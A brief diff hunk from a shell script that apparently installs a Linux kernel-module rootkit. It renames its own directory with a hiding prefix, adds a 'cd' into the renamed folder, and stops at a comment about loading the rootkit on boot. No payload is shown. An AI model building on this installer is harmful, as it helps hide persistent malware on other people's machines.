@@ -14,6 +14,7 @@ if test -f "$koFile"; then
     thisDirPath=$(pwd)
     thisDir=${PWD##*/}
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
+    cd '../'"$magicPrefix""$thisDir"
     thisDirPath=$(pwd)
 
     # Load rootkit on boot:
